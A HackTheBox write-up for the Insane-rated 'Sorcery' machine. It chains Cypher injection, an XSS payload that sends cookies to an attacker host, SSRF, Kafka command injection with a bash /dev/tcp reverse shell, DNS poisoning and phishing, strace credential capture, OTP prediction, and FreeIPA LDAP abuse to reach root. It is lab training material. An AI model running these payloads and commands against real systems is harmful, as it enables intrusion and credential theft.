# Sorcery — HackTheBox (Insane)

![HTB Badge](https://img.shields.io/badge/HackTheBox-Insane-red)
![OS](https://img.shields.io/badge/OS-Linux-brightgreen)
![Rating](https://img.shields.io/badge/Rating-Insane-red)

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Application Analysis](#web-application-analysis)
- [Source Code Review (Gitea)](#source-code-review-gitea)
- [Initial Foothold — Cypher Injection](#initial-foothold--cypher-injection)
- [WebAuthn Passkey Bypass via XSS](#webauthn-passkey-bypass-via-xss)
- [SSRF via Debug Endpoint](#ssrf-via-debug-endpoint)
- [RCE — Kafka Command Injection](#rce--kafka-command-injection)
- [DNS Poisoning & Phishing](#dns-poisoning--phishing)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
  - [Xvfb Framebuffer Extraction](#xvfb-framebuffer-extraction)
  - [Docker Credential Harvesting via Strace](#docker-credential-harvesting-via-strace)
  - [.NET Credential Helper Reversing & OTP Bypass](#net-credential-helper-reversing--otp-bypass)
  - [Docker Registry Enumeration](#docker-registry-enumeration)
  - [FreeIPA LDAP Privilege Chain](#freeipa-ldap-privilege-chain)
- [Root Flag](#root-flag)
- [Attack Chain Summary](#attack-chain-summary)

---

## Overview

**Sorcery** is an Insane-rated Linux machine on HackTheBox that features a complex attack chain spanning web exploitation, container breakouts, cryptography, social engineering, binary reversing, and Active Directory (FreeIPA/Kerberos) abuse.

The machine hosts a dockerized Next.js + Rust web application backed by Neo4j, Kafka, FTP, Gitea, a mail system, and a FreeIPA domain controller. Exploitation requires chaining multiple vulnerabilities across different containers and services to ultimately achieve root access.

**Key Technologies:** Docker, Next.js, Rust, Neo4j (Cypher), Kafka, FreeIPA/Kerberos, LDAP, SSSD, WebAuthn, DNS, TLS/PKI, .NET AOT

---

## Reconnaissance

### Nmap Scan

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
443/tcp open  ssl/http nginx 1.27.1
```

The HTTPS service runs Nginx reverse-proxying a **Next.js** application. The TLS certificate reveals the hostname `sorcery.htb`. Subdomain enumeration finds `git.sorcery.htb` hosting a **Gitea** instance.

```bash
echo "10.10.11.XX  sorcery.htb git.sorcery.htb" >> /etc/hosts
```

---

## Web Application Analysis

The main web app at `https://sorcery.htb` is a dashboard application with:
- User registration and login
- A **Neo4j**-backed data layer
- **WebAuthn/Passkey** authentication for privileged operations
- A **debug** endpoint restricted to admin users with passkey auth
- A mail bot system that visits links sent via email

---

## Source Code Review (Gitea)

The Gitea instance at `git.sorcery.htb` hosts a public **infrastructure repository** containing the full source code:

```bash
git clone https://git.sorcery.htb/sorcery/infrastructure.git
```

Key findings from source code review:

| Component | File | Vulnerability |
|-----------|------|---------------|
| Backend (Rust) | `src/api/users/*.rs` | **Cypher Injection** in user search |
| Frontend (Next.js) | `src/app/dashboard/debug/actions.tsx` | **SSRF** via TCP proxy server action |
| Backend (Rust) | `src/api/debug/debug.rs` | **TCP proxy** (requires Admin + Passkey) |
| Backend (Rust) | `src/services/kafka.rs` | **Command Injection** via Kafka topic names |
| Frontend | `src/app/dashboard/profile/page.tsx` | **XSS sink** in profile rendering |
| Mail Bot | `bot/index.js` | Automated link visitor (phishing target) |
| Docker Compose | `docker-compose.yml` | Full architecture with DNS, FTP, mail containers |
| FTP | Certificate setup | **RootCA** stored in FTP container |

---

## Initial Foothold — Cypher Injection

The user search endpoint passes input directly into a Neo4j Cypher query without proper sanitization.

**Exploitation:**

```
' OR 1=1 RETURN n //
```

This reveals all users in the database, including the **admin** account. Using `LOAD CSV` or `UNION` techniques, we can extract the admin's JWT secret and forge a valid admin token.

The forged admin JWT:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjJk...REDACTED
```

> **Note:** The admin token alone isn't sufficient — privileged endpoints require `withPasskey: true`, which needs WebAuthn authentication.

---

## WebAuthn Passkey Bypass via XSS

The profile page renders user-controlled content without sanitization, creating an **XSS** vulnerability. The **mail_bot** system automatically visits links sent to specific email addresses.

**Attack chain:**

1. Register a user with an XSS payload in the profile that steals the `token` cookie
2. Use the mail system to send a link to the bot's email address
3. The bot (authenticated as admin with passkey) visits the link
4. XSS fires and exfiltrates the admin's `token` cookie (which has `withPasskey: true`)

```javascript
// XSS payload (simplified)
<script>fetch('https://ATTACKER/steal?c='+document.cookie)</script>
```

The captured token contains `"withPasskey": true` and `"privilegeLevel": 2`, granting full access to the debug endpoint.

---

## SSRF via Debug Endpoint

The debug endpoint at `POST /debug/port` acts as a **TCP proxy**, allowing arbitrary connections from the backend container:

```json
{
  "host": "TARGET_HOST",
  "port": TARGET_PORT,
  "data": ["hex_encoded_data"],
  "expect_result": true
}
```

This enables reaching **internal Docker services** not exposed externally. Through this proxy we can interact with internal containers on the Docker network (`172.19.0.x`).

---

## RCE — Kafka Command Injection

The Kafka service handler in the Rust backend constructs shell commands using topic names without sanitization:

```rust
// Vulnerable pattern (simplified)
let cmd = format!("kafka-topics --topic {}", topic_name);
Command::new("sh").arg("-c").arg(&cmd).output()
```

Using the SSRF/debug proxy to interact with Kafka on port `9092`, we inject commands via a crafted topic name:

```
; bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' #
```

This gives us a **reverse shell inside the DNS container** (`172.19.0.3`).

---

## DNS Poisoning & Phishing

### Inside the DNS Container

The DNS container runs **CoreDNS** and contains:
- The domain's **RootCA private key** (encrypted with passphrase: `p]REDACTED[d`)
- Full control over DNS resolution for the `sorcery.htb` domain
- An FTP server with the CA certificate chain

### The Attack

1. **Decrypt the RootCA key:**
   ```bash
   openssl rsa -in RootCA.key -out RootCA_decrypted.key
   ```

2. **Generate a TLS certificate** for `git.sorcery.htb` signed by the trusted RootCA

3. **Poison DNS** — modify CoreDNS configuration to resolve `git.sorcery.htb` → attacker IP

4. **Set up a phishing Gitea clone** on the attacker machine with the forged TLS certificate

5. The **mail_bot** or other automated systems attempt to access `git.sorcery.htb`, which now resolves to our server

6. Capture credentials: `tom_summers:j]REDACTED[.`

---

## User Flag

```bash
ssh tom_summers@sorcery.htb
cat ~/user.txt
```

```
6aba5565XXXXXXXXXXXXXXXXXXXX6296
```

---

## Privilege Escalation

### Enumeration

On the host, we discover:
- **FreeIPA/Kerberos** domain `SORCERY.HTB` with DC at `dc01.sorcery.htb` (172.23.0.2)
- **Docker** with `userns-remap` enabled
- `ksu.mit` — SUID Kerberos su binary at `/usr/bin/ksu.mit`
- `cleanup.timer` → runs `/opt/scripts/cleanup.sh` as user `admin` every 10 minutes
- `/opt/scripts/` owned by `admin:admins` (mode 0700)
- Multiple local users: `tom_summers`, `tom_summers_admin`, `rebecca_smith`
- IPA users: `admin`, `donna_adams`, `ash_winter`

**Sudo rules for tom_summers_admin:**
```
(rebecca_smith) NOPASSWD: /usr/bin/docker login
(rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

### Xvfb Framebuffer Extraction

The user `tom_summers_admin` runs **Xvfb** (X Virtual Framebuffer) on display `:1` with **mousepad** editing a `passwords.txt` file.

```bash
# Dump the framebuffer
xwd -root -display :1 -out /tmp/screen.xwd

# Convert and view
convert screen.xwd screen.png
```

The screenshot reveals: `tom_summers_admin:d]REDACTED[-`

### Docker Credential Harvesting via Strace

With `tom_summers_admin`, we can strace processes run by `rebecca_smith`. The sudo rule allows running `docker login` as rebecca_smith:

```bash
# Terminal 1 - Start docker login as rebecca_smith
sudo -u rebecca_smith /usr/bin/docker login &

# Terminal 2 - Attach strace to capture credentials
sudo -u rebecca_smith /usr/bin/strace -s 128 -p <PID>
```

Strace captures the credentials from stdin: `rebecca_smith:-]REDACTED[g`

### .NET Credential Helper Reversing & OTP Bypass

Docker uses a custom credential helper at `/usr/bin/docker-credential-docker-auth` — a **67MB .NET 8.0 AOT-compiled binary**.

**Extraction and decompilation:**

```bash
# Extract managed .NET assembly from the AOT binary
dotnet-sdk extract docker-credential-docker-auth
# Decompile with ILSpy
ilspycmd docker-auth.dll
```

**Key findings from decompiled source:**

1. **AES encryption with hardcoded all-zero key and IV** (16 bytes of 0x00) for storing credentials
2. **OTP generation** is deterministic:
   ```csharp
   int seed = DateTime.Now.Minute / 10 + (int)userId;
   int otp = new Random(seed).Next(100000, 999999);
   ```
3. The OTP is **appended to the password** for registry authentication: `<password><otp>`
4. The OTP changes every **10 minutes** and is based on the user's UID

**Calculating the OTP:**

The .NET `Random` class uses a specific algorithm. We reimplemented it in Python:

```python
# rebecca_smith UID = 2003
# seed = Minute/10 + 2003
# Possible OTPs per 10-minute window:
# Min 0-9:   seed=2003 → OTP=229732
# Min 10-19: seed=2004 → OTP=699914
# Min 20-29: seed=2005 → OTP=270098
# Min 30-39: seed=2006 → OTP=740280
# Min 40-49: seed=2007 → OTP=310463
# Min 50-59: seed=2008 → OTP=780645
```

### Docker Registry Enumeration

Authenticating to the Docker registry at `localhost:5000` with `rebecca_smith:-]REDACTED[g<OTP>`:

```bash
curl -u "rebecca_smith:-7eAZDXXXXX699914" https://localhost:5000/v2/_catalog
# {"repositories":["test-domain-workstation"]}
```

Pulling and inspecting the image reveals a **docker-entrypoint.sh** with FreeIPA enrollment credentials:

```bash
ipa-client-install --unattended \
  --principal donna_adams \
  --password '3]REDACTED[H' \
  --server dc01.sorcery.htb \
  --domain sorcery.htb
```

### FreeIPA LDAP Privilege Chain

With `donna_adams`'s IPA credentials, we authenticate to the Kerberos realm and enumerate LDAP:

```bash
kinit donna_adams@SORCERY.HTB
```

**LDAP enumeration reveals the privilege chain:**

| User | IPA Role/Permission | Capability |
|------|-------------------|------------|
| `donna_adams` | `change_userPassword_ash_winter_ldap` | Can change ash_winter's password |
| `ash_winter` | `add_sysadmin` | Can add members to `sysadmins` group |
| `ash_winter` | Local sudoer | `(root) NOPASSWD: /usr/bin/systemctl restart sssd` |

**Exploitation chain:**

1. **donna_adams changes ash_winter's password** via LDAP (requires LDAPS):
   ```bash
   LDAPTLS_REQCERT=never ldapmodify -x -H ldaps://dc01.sorcery.htb \
     -D "uid=donna_adams,cn=users,cn=accounts,dc=sorcery,dc=htb" \
     -w "3FXXXXXX" <<EOF
   dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
   changetype: modify
   replace: userPassword
   userPassword: NewPass!
   EOF
   ```

2. **SSH as ash_winter**, get Kerberos TGT, **add self to sysadmins group**:
   ```bash
   kinit ash_winter@SORCERY.HTB
   # Add to sysadmins via LDAP
   ```

3. **Modify the IPA sudo rule** to grant ash_winter `(ALL:ALL) ALL`:
   ```bash
   ldapmodify ... <<EOF
   dn: ipaUniqueID=cd848e9c-...,cn=sudorules,cn=sudo,dc=sorcery,dc=htb
   changetype: modify
   add: memberUser
   memberUser: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
   EOF
   ```

4. **Restart SSSD** (allowed via local sudo rule) to force re-reading the modified LDAP sudo rules:
   ```bash
   sudo /usr/bin/systemctl restart sssd
   ```

5. After SSSD restart, `sudo -l` now shows:
   ```
   (root) NOPASSWD: /usr/bin/systemctl restart sssd
   (ALL : ALL) ALL
   ```

---

## Root Flag

```bash
sudo cat /root/root.txt
```

```
9bc5571263XXXXXXXXXXXXXXXX9f6a4d
```

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    SORCERY — Attack Chain                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Gitea (Source Code) ──► Cypher Injection ──► Admin Account      │
│           │                                                      │
│           ▼                                                      │
│  XSS + Mail Bot ──► Admin Passkey Token                          │
│           │                                                      │
│           ▼                                                      │
│  Debug SSRF ──► Kafka RCE ──► DNS Container Shell                │
│           │                                                      │
│           ▼                                                      │
│  RootCA Crack ──► DNS Poisoning ──► Phishing                     │
│           │                                                      │
│           ▼                                                      │
│  tom_summers (SSH) ──────────────────► user.txt ✓                │
│           │                                                      │
│           ▼                                                      │
│  Xvfb Framebuffer ──► tom_summers_admin                          │
│           │                                                      │
│           ▼                                                      │
│  Strace docker login ──► rebecca_smith                           │
│           │                                                      │
│           ▼                                                      │
│  .NET Credential Helper Reversing ──► OTP Algorithm              │
│           │                                                      │
│           ▼                                                      │
│  Docker Registry ──► test-domain-workstation image               │
│           │                                                      │
│           ▼                                                      │
│  docker-entrypoint.sh ──► donna_adams (IPA creds)                │
│           │                                                      │
│           ▼                                                      │
│  LDAP: Change ash_winter password                                │
│           │                                                      │
│           ▼                                                      │
│  LDAP: Add to sysadmins + Modify sudo rule                      │
│           │                                                      │
│           ▼                                                      │
│  Restart SSSD ──► sudo (ALL:ALL) ALL ──► root.txt ✓              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Tools Used

- **nmap** — Port scanning
- **Burp Suite** — Web proxy & request manipulation
- **ilspycmd** — .NET decompilation
- **openssl** — TLS certificate generation & CA operations
- **ldapsearch/ldapmodify** — LDAP queries and modifications
- **kinit/klist** — Kerberos ticket management
- **xwd** — X11 framebuffer dumping
- **strace** — Process tracing
- **Python** — OTP calculation, .NET Random reimplementation
- **curl** — Docker registry API interaction

---

## Tags

`docker` `docker-credential-helper` `docker-registry` `free-ipa` `kerberos` `ldap` `sssd` `otp`
`x-virtual-framebuffer` `xvfb` `cypher-injection` `neo4j` `webauthn` `xss` `ssrf` `kafka`
`dns-poisoning` `phishing` `tls` `pki` `dot-net` `aot` `reverse-engineering`

---

*Writeup by kali — March 2026*
